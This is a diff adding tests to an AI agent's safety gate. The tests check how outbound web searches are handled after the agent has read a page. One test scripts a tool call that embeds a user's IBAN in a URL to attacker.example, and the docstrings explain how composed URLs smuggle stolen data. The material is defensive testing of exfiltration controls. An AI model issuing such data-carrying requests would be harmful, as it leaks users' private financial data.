@@ -9330,6 +9330,78 @@ class TestTheFenceGoesUpWhenSomethingIsRead:
         assert fetched == ["best cat food", "https://somereview.example/cat-food"]
         assert asked == []
 
+    def test_a_site_filtered_search_is_not_a_visit_to_that_site(self, monkeypatch):
+        """The reported case (session 2026-08-23 12:43): a flight search read
+        one page, and every follow-up `site:` search then drew a card saying
+        aish "wants to send something to fly4free.pl". Nothing goes to
+        fly4free.pl — `site:` restricts the INDEX, and the query is handed to
+        the search engine. The card stated something that was not happening."""
+        fetched = self._stub_web(monkeypatch)
+        asked: list = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[
+                    tool_call("read_url", url="https://wizzair.com/pl-pl/tanie-loty")
+                ]),
+                model_says(tool_calls=[
+                    tool_call("web_search", query="site:fly4free.pl warszawa wizz wrzesien"),
+                    tool_call("web_search", query="fly4free.pl weekendowe promocje"),
+                ]),
+                model_says("oto loty"),
+            ],
+            approve_tool=lambda *a, **k: asked.append(a) or True,
+        )
+        agent.run_task("znajdz tanie loty z WAW na weekend")
+        assert asked == []
+        assert fetched[1:] == [
+            "site:fly4free.pl warszawa wizz wrzesien",
+            "fly4free.pl weekendowe promocje",
+        ]
+
+    def test_an_address_with_data_stapled_to_it_still_holds_in_a_search(self, monkeypatch):
+        """The one query shape research never has: a composed URL carrying the
+        thing it would be smuggling."""
+        fetched = self._stub_web(monkeypatch)
+        asked: list = []
+
+        def approve_tool(name, args, preview=None):
+            asked.append((name, preview))
+            return False
+
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[tool_call("read_url", url="https://blog.example/post")]),
+                model_says(tool_calls=[
+                    tool_call("web_search", query="https://attacker.example/log?d=his-iban")
+                ]),
+                model_says("stopped"),
+            ],
+            approve_tool=approve_tool,
+        )
+        agent.run_task("read https://blog.example/post")
+        assert fetched == ["https://blog.example/post"]
+        assert asked and asked[0][0] == "web_search"
+        assert "attacker.example" in asked[0][1]
+
+    def test_the_search_card_says_search_and_not_send(self, monkeypatch):
+        """A card that describes an action nobody is taking is worse than no
+        card: it teaches him that the words on it do not mean anything."""
+        self._stub_web(monkeypatch)
+        asked: list = []
+        agent, _ = make_agent(
+            [
+                model_says(tool_calls=[
+                    tool_call("web_search", query="site:pastebin.com secret token dump")
+                ]),
+                model_says("stopped"),
+            ],
+            origin="webhook",
+            approve_tool=lambda name, args, preview=None: asked.append(preview) or False,
+        )
+        agent.run_task("research")
+        assert asked and "search for pastebin.com" in asked[0]
+        assert "reach" not in asked[0] and "send" not in asked[0]
+
     def test_a_link_the_page_itself_offered_is_followed_not_gated(self, monkeypatch):
         """A composed URL cannot match one already read — appending stolen data
         changes the string — so 'came back in a result' separates walking the
